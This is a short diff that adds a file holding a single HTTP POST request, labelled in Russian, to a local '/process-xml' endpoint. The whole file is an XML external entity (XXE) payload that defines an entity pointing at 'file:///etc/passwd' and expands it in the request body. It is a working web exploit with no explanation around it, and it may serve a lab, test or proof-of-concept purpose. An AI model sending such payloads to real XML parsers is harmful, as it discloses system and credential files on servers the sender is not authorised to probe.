@@ -1,0 +1,12 @@
+HTTP-запрос:
+
+POST /process-xml HTTP/1.1
+Host: localhost:5000
+Content-Type: text/xml
+Content-Length: 150
+
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<foo>&xxe;</foo>
